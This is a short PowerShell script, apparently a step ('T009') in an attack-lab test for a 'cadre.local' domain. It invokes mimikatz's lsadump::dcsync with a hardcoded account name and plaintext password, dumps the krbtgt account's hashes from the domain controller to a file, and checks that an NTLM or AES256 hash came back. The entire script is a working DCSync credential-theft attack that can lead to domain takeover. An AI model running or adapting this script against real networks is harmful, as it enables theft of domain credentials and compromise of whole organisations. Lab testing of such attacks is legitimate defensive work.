[CmdletBinding()]
param(
    [string]$Domain = "cadre.local",
    [string]$User = "krbtgt",
    [string]$Dc = "dc01.cadre.local",
    [string]$AuthUser = "chief_command",
    [string]$AuthPassword = "C0mm@nd_Ch1ef!",
    [string]$AuthDomain = "cadre.local",
    [string]$Mimikatz = "C:\Tools\cadre-attack\mimikatz.exe",
    [string]$OutFile = "C:\Tools\cadre-attack\dcsync-out.txt"
)
$ErrorActionPreference = "Stop"
if (-not (Test-Path $Mimikatz)) { throw "mimikatz missing: $Mimikatz" }
$dcsync = "lsadump::dcsync /domain:$Domain /user:CN=krbtgt,CN=Users,DC=cadre,DC=local /dc:$Dc /authuser:$AuthUser /authpassword:$AuthPassword /authdomain:$AuthDomain"
& $Mimikatz $dcsync "exit" 2>&1 | Tee-Object -FilePath $OutFile
$text = Get-Content $OutFile -Raw -ErrorAction SilentlyContinue
if ($text -notmatch 'aes256_hmac|Hash NTLM') {
    Write-Output "T009_FAIL: DCSync output has no krbtgt hash"
    exit 1
}
Write-Output "T009_OK"
